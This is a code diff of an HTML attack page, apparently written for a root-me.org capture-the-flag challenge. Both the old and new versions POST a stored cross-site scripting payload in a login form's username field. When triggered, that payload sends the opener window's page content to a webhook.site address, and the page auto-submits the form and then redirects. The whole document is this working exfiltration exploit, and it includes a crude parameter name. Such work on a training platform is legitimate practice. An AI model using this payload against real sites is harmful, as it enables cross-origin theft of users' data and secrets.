@@ -5,22 +5,24 @@
     <title>Second window</title>
 </head>
 <body>
-
 <h1>Page 2</h1>
+<form method="POST" action="http://challenge01.root-me.org:58003/login">
+    <input type="text" name="username" value="<script>document.location='https://webhook.site/339f0497-f8d9-43af-9508-3b65ed3f0873?g6gResult='+encodeURI(window.opener.document.querySelectorAll('section>p')[2].innerHTML);</script>">
+    <input type="text" name="secret" value="FAILED">
+    <input type="submit">
+</form>
+
 <script>
     window.opener.postMessage({redirect: "go"}, "*");
-    setTimeout(() => postPayload(), 1500)
-    setTimeout(() => document.location="http://challenge01.root-me.org:58003/profile", 4000)
 
 
-    function postPayload() {
-        fetch("http://challenge01.root-me.org:58003/login", {
-            method: "POST",
-            body: `username=%3cscript>document.location='https://webhook.site/339f0497-f8d9-43af-9508-3b65ed3f0873?RESULTMOTHERFOCKER='+encodeURI(window.opener.document.querySelectorAll('section>p')[2].innerHTML);%3c/script>`
-                +`&secret=FAILED `,
-            mode: "no-cors"
-        })
-    }
+    const resp = document.querySelector("form").submit();
+
+    // Navigation après, laisse le temps au fetch de partir
+    setTimeout(() => {
+        location.href = "http://challenge01.root-me.org:58003/profile";
+    }, 4000);
+
 
 </script>
 
